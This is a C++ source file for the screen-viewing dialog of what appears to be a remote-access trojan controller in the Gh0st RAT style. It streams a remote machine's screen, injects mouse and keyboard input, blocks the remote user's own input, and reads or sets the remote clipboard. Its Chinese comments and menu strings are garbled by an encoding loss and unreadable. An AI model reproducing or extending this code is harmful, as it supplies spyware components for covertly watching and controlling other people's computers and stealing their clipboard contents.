// ScreenSpyDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Remote.h"
#include "ScreenSpyDlg.h"
#include "afxdialogex.h"
#include "Common.h"
#include "IOCPServer.h"

// CScreenSpyDlg �Ի���

enum
{
	IDM_CONTROL = 0x0010,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// ������ʾԶ�����
	IDM_BLOCK_INPUT,	// ����Զ�̼��������
	IDM_SAVEDIB,		// ����ͼƬ
	IDM_GET_CLIPBOARD,	// ��ȡ������
	IDM_SET_CLIPBOARD,	// ���ü�����
};

#define  ALGORITHM_DIFF  1

IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)

CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CScreenSpyDlg::IDD, pParent)
{
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_bIsFirst		= true; // ����ǵ�һ�δ򿪶Ի�����ʾ��ʾ�ȴ���Ϣ
	m_lpScreenDIB	= NULL;
	char szPath[MAX_PATH];
	GetSystemDirectory(szPath, MAX_PATH);
	lstrcat(szPath, "\\shell32.dll");
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szPath, 17/*�����ھ�ͼ������*/);

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);

	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	//��Ҫ����������ｫ����˷�������bmp�ṹͷ�ͷ������Ļ��С��������
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	m_lpbmi_rect = (BITMAPINFO *) new BYTE[nBISize];
	
	//������Ǳ���bmpλͼͷ��
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);

	memset(&m_MMI, 0, sizeof(MINMAXINFO));

	m_bIsCtrl = false; // Ĭ�ϲ�����
	m_nCount = 0;
	m_bCursorIndex = 1;
}

CScreenSpyDlg::~CScreenSpyDlg()
{
}

void CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
	ON_WM_GETMINMAXINFO()
	ON_WM_HSCROLL()
	ON_WM_VSCROLL()
END_MESSAGE_MAP()


// CScreenSpyDlg ��Ϣ�������


BOOL CScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "������Ļ(&Y)");
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "���ٱ��ض����(&T)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "�������ض����ͼ���(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "�������(&S)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "��ȡ������(&R)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "���ü�����(&L)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
	
	}

	CString str;
	str.Format("\\\\%s %d * %d", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);

	m_HScrollPos = 0;
	m_VScrollPos = 0;
	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);

	ICONINFO CursorInfo;
	::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	if (CursorInfo.hbmMask != NULL)
		::DeleteObject(CursorInfo.hbmMask);
	if (CursorInfo.hbmColor != NULL)
		::DeleteObject(CursorInfo.hbmColor);
	m_dwCursor_xHotspot = CursorInfo.xHotspot;
	m_dwCursor_yHotspot = CursorInfo.yHotspot;

	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.x = 0;
	m_bIsTraceCursor = false;

	//�ͱ��ض�һ����λͼ��ͼ������
	//�����Ƿ���õĻ�����Ҳ����˵���ǿ��Ը����������������������ı�λͼͼ��
	m_hDC = ::GetDC(m_hWnd);
	m_hMemDC = CreateCompatibleDC(m_hDC);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);   //����Ӧ�ó������ֱ��д��ġ����豸�޹ص�λͼ
	SelectObject(m_hMemDC, m_hFullBitmap);//��һ����ָ�����豸�����Ļ���
	
	
	
	SetScrollRange(SB_HORZ, 0, m_lpbmi->bmiHeader.biWidth);  //ָ����������Χ����Сֵ�����ֵ
	SetScrollRange(SB_VERT, 0, m_lpbmi->bmiHeader.biHeight);

	InitMMI();
	SendNext();
	return TRUE; 
}


void CScreenSpyDlg::InitMMI(void)
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);  //���ڵı߿���εĳߴ硣�óߴ����������Ļ�������Ͻǵ���Ļ�������
	GetClientRect(&rectClient);  //�ú�����ȡ���ڿͻ��������ꡣ�ͻ�������ָ���ͻ��������ϽǺ����½ǡ����ڿͻ�����������Դ��ڿͻ��������ϽǶ��Եģ�������Ͻ�����Ϊ��0��0��
	ClientToScreen(&rectClient);

	int	nBorderWidth = rectClient.left - rectWindow.left; // �߿��
	int	nTitleWidth = rectClient.top - rectWindow.top; // �������ĸ߶�

	int	nWidthAdd = nBorderWidth * 2 + GetSystemMetrics(SM_CYHSCROLL);   //���ڵõ��������ϵͳ���ݻ���ϵͳ������Ϣ. ˮƽ�������ĸ߶Ⱥ�ˮƽ�������ϼ�ͷ�Ŀ��
	int	nHeightAdd = nTitleWidth + nBorderWidth + GetSystemMetrics(SM_CYVSCROLL);
	int	nMinWidth = 400 + nWidthAdd;                            //���ô�����С��ʱ�Ŀ�ȣ��߶�
	int	nMinHeight = 300 + nHeightAdd; 
	int	nMaxWidth = m_lpbmi->bmiHeader.biWidth + nWidthAdd;     //���ô������ʱ�Ŀ�ȣ��߶�
	int	nMaxHeight = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	//���ô�����С��ȡ��߶�
	m_MMI.ptMinTrackSize.x = nMinWidth;
	m_MMI.ptMinTrackSize.y = nMinHeight;

	// ���ʱ���ڵ�λ��
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;

	// �������ߴ�
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;

	// ������󻯳ߴ�
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;
}


void CScreenSpyDlg::SendNext(void)
{
	BYTE	bBuff = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}




void CScreenSpyDlg::OnReceiveComplete(void)
{
	m_nCount++;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN:
		{
			DrawFirstScreen();            //������ʾ��һ֡ͼ�� һ��ת����������
			break;
		}
	case TOKEN_NEXTSCREEN:
		{
			if (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1] == ALGORITHM_DIFF)   //���ǿ���������ʹ�ò�ͬ���㷨    
				DrawNextScreenDiff();     //�����ǵڶ�֮֡���������

			break;
		}
	
	case TOKEN_CLIPBOARD_TEXT:            //��ȡ���ض˵ļ��а�����
		{
			UpdateLocalClipboard((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
			break;
		}
	        
		
	default:
		// ���䷢���쳣����
		return;
	}
}

void CScreenSpyDlg::DrawFirstScreen(void)
{
	m_bIsFirst = false;
	//�õ����ض˷��������� ������������HBITMAP�Ļ������У�����һ��ͼ��ͳ�����
	memcpy(m_lpScreenDIB, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_lpbmi->bmiHeader.biSizeImage);

	PostMessage(WM_PAINT);//����WM_PAINT��Ϣ
}


void CScreenSpyDlg::DrawNextScreenDiff(void)
{
	//�ú�������ֱ�ӻ�����Ļ�ϣ����Ǹ���һ�±仯���ֵ���Ļ����Ȼ�����
	//OnPaint����ȥ
	//��������Ƿ��ƶ�����Ļ�Ƿ�仯�ж��Ƿ��ػ���꣬��ֹ�����˸
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // ��ʶ + �㷨 + ���λ�� + �����������[][][][][][][][][][][][][][][][
	LPVOID	lpFirstScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
	DWORD	dwBytes = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	POINT	oldPoint;
	memcpy(&oldPoint, &m_RemoteCursorPos, sizeof(POINT));
	memcpy(&m_RemoteCursorPos, m_pContext->m_DeCompressionBuffer.GetBuffer(2), sizeof(POINT));

	// ����ƶ���
	if (memcmp(&oldPoint, &m_RemoteCursorPos, sizeof(POINT)) != 0)
		bIsReDraw = true;

	// ������ͷ����仯
	int	nOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10)[0];   //181
	if (nOldCursorIndex != m_bCursorIndex)
	{
		bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));  //�滻ָ�������������WNDCLASSEX�ṹ
	}

	// ��Ļ�Ƿ�仯
	if (dwBytes > 0) 
		bIsReDraw = true;

	//lodsdָ���ESIָ����ڴ�λ����AL/AX/EAX��װ ��һ��ֵ
	//movsbָ���ֽڴ������ݣ�ͨ��SI��DI�������Ĵ��������ַ�����Դ��ַ��Ŀ���ַ
	__asm
	{
		mov ebx, [dwBytes]        //HexxWorld   edi
		                          //HexxWorxx
		mov esi, [lpNextScreen]   //����[8][2]xx      ecx = 2
		jmp	CopyEnd
CopyNextBlock:
		mov edi, [lpFirstScreen]   //��ǰ
		lodsd	        // ��lpNextScreen�ĵ�һ��˫�ֽڣ��ŵ�eax��,����DIB�иı������ƫ��
		add edi, eax	// lpFirstScreenƫ��eax	
		lodsd           // ��lpNextScreen����һ��˫�ֽڣ��ŵ�eax��, ���Ǹı�����Ĵ�С
		mov ecx, eax
		sub ebx, 8      // ebx ��ȥ ����dword
		sub ebx, ecx    // ebx ��ȥDIB���ݵĴ�С    
		rep movsb
CopyEnd:
		cmp ebx, 0 // �Ƿ�д�����
			jnz CopyNextBlock
	}

	if (bIsReDraw) PostMessage(WM_PAINT);;
}

void CScreenSpyDlg::UpdateLocalClipboard(char *buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GPTR, len);
	if (hglbCopy != NULL) { 
	
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		GlobalUnlock(hglbCopy);         
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}


void CScreenSpyDlg::SendLocalClipboard(void)
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	delete[] lpData;
}


void CScreenSpyDlg::OnPaint()
{
	CPaintDC dc(this); 

	if (m_bIsFirst)
	{
		DrawTipString("��ȴ�...........");
		return;
	}
	
	//�������豸���������Ƶ����ǵ��ڴ滺�������������ץͼ��
	//���ڴ滺�������Ƶ��豸������������ʾͼ�ˡ�
	BitBlt
		(
		m_hDC,
		0,
		0,
		m_lpbmi->bmiHeader.biWidth, 
		m_lpbmi->bmiHeader.biHeight,
		m_hMemDC,
		m_HScrollPos,
		m_VScrollPos,
		SRCCOPY
		);

	
	//���ﻭһ������ͼ��
	if (m_bIsTraceCursor)
		DrawIconEx(
		m_hDC,								
		m_RemoteCursorPos.x - ((int) m_dwCursor_xHotspot) - m_HScrollPos, 
		m_RemoteCursorPos.y - ((int) m_dwCursor_yHotspot) - m_VScrollPos,
		m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
		0,0,										
		0,										
		NULL,									
		DI_NORMAL | DI_COMPAT					
		);
	
}


void CScreenSpyDlg::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
	//COLORREF�������һ��RGB��ɫ
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);	
	COLORREF oldbgcol  = SetBkColor(m_hDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
	//ExtTextOut���������ṩһ���ɹ�ѡ��ľ��Σ��õ�ǰѡ������塢������ɫ��������ɫ������һ���ַ���
	ExtTextOut(m_hDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

	DrawText (m_hDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hDC, oldbgcol);
	SetTextColor(m_hDC, oldtxtcol);
}

void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_CONTROL:
		{
			m_bIsCtrl = !m_bIsCtrl;
			pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);

			if (m_bIsCtrl)
			{
				if (m_bIsTraceCursor)
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
				else
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
			}
			else
			{
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
			}


			break;
		}
	
	case IDM_TRACE_CURSOR: // ���ٱ��ض����
		{	
			m_bIsTraceCursor = !m_bIsTraceCursor;	                               //�����ڸı�����
			pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);    //�ڲ˵��򹳲���
		
			// �ػ���������ʾ���
			OnPaint();

			break;
		}

	case IDM_BLOCK_INPUT: // ������������ͼ���
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

			BYTE	bToken[2];
			bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
			bToken[1] = !bIsChecked;
			m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));

			break;
		}
	case IDM_SAVEDIB:    // ���ձ���
		{
			SaveSnapshot();
			break;
		}

	case IDM_GET_CLIPBOARD: // ��ȡ������
		{
			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));

			break;
		}
		
	case IDM_SET_CLIPBOARD: // ���ü�����
		{
			SendLocalClipboard();

			break;
		}
	

	default:
		CDialog::OnSysCommand(nID, lParam);
	}

	CDialog::OnSysCommand(nID, lParam);
}




bool CScreenSpyDlg::SaveSnapshot(void)
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "λͼ�ļ�(*.bmp)|*.bmp|", this);
	if(dlg.DoModal () != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("�ļ�����ʧ��");
		return false;
	}

	// BITMAPINFO��С
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);

	
	hdr.bfType			= ((WORD) ('M' << 8) | 'B');	
	hdr.bfSize			= lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 	= 0;
	hdr.bfReserved2 	= 0;
	hdr.bfOffBits		= sizeof(hdr) + nbmiSize;
	
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();

	return true;

}


BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)   //�����Ϣ���˺���
{

#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l)
	CRect rect;
	GetClientRect(&rect);

	switch (pMsg->message)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MOUSEMOVE:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MOUSEWHEEL:
		{
			MSG	msg;
			memcpy(&msg, pMsg, sizeof(MSG));
			msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);     
			msg.pt.x += m_HScrollPos; 
			msg.pt.y += m_VScrollPos;
			SendCommand(&msg);
		}
		break;
	case WM_KEYDOWN:
	case WM_KEYUP:
	case WM_SYSKEYDOWN:
	case WM_SYSKEYUP:
		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
		{
			MSG	msg;
			memcpy(&msg, pMsg, sizeof(MSG));
			msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);
			msg.pt.x += m_HScrollPos;
			msg.pt.y += m_VScrollPos;
			SendCommand(&msg);
		}
		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return true;
		break;
	default:
		break;
	}
	return CDialog::PreTranslateMessage(pMsg);
}



void CScreenSpyDlg::SendCommand(MSG* pMsg)
{
	if (!m_bIsCtrl)
		return;

	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL;
	memcpy(lpData + 1, pMsg, sizeof(MSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);

	delete[] lpData;
}

void CScreenSpyDlg::OnGetMinMaxInfo(MINMAXINFO* lpMMI)  //�����ڴ�С�����仯ʱ����Ӧ��˳�������ǣ�WM_GETMINMAXINFO-->WM_SIZING-->WM_SIZE��
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ

	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void *)lpMMI, &m_MMI, sizeof(MINMAXINFO));

	CDialog::OnGetMinMaxInfo(lpMMI);
}




void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	SCROLLINFO si;
	int	i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &si);

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return;
	}

	i = max(i, si.nMin);
	i = min(i, (int)(si.nMax - si.nPage + 1));

	RECT rect;
	GetClientRect(&rect);

	if ((rect.right + i) > m_lpbmi->bmiHeader.biWidth)
		i = m_lpbmi->bmiHeader.biWidth - rect.right;

	InterlockedExchange((PLONG)&m_HScrollPos, i);

	SetScrollPos(SB_HORZ, m_HScrollPos);

	OnPaint();
	CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
}


void CScreenSpyDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	SCROLLINFO si;
	int	i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_VERT, &si);

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return;
	}

	i = max(i, si.nMin);
	i = min(i, (int)(si.nMax - si.nPage + 1));


	RECT rect;
	GetClientRect(&rect);

	if ((rect.bottom + i) > m_lpbmi->bmiHeader.biHeight)
		i = m_lpbmi->bmiHeader.biHeight - rect.bottom;

	InterlockedExchange((PLONG)&m_VScrollPos, i);

	SetScrollPos(SB_VERT, i);
	OnPaint();
	CDialog::OnVScroll(nSBCode, nPos, pScrollBar);
}
